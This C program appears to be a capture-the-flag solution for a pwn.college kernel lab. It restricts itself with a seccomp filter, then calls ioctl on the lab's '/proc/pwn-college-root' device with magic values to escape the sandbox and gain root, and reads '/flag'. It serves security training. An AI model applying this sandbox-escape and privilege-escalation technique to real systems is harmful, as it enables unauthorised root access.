#include <assert.h>
#include <seccomp.h>
#include <string.h>
#include <stdio.h>

int main(){
    int fd = open("/proc/pwn-college-root", 2);
    assert(fd > 0);
    
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ERRNO(1337));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(ioctl), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    assert(seccomp_load(ctx) >= 0);

    printf("Before breaking out...\n");
    printf("Getting uid failed: %d\n", getuid());

    printf("Breaking out!\n");
    ioctl(fd, 0x7001, 0x31337);

    printf("uid before: %d\n", getuid());
    printf("gaining root...\n");
    ioctl(fd, 0x7001, 0x13371337);
    printf("uid after: %d\n", getuid());

    int flag_fd = open("/flag", 0);
    assert(flag_fd > 0);
    char flag_buf[512];
    memset(flag_buf, 0, sizeof(flag_buf));
    int n = read(flag_fd, flag_buf, sizeof(flag_buf));
    assert(n > 0);
    printf("Flag: %s\n", flag_buf);

    return 0;
}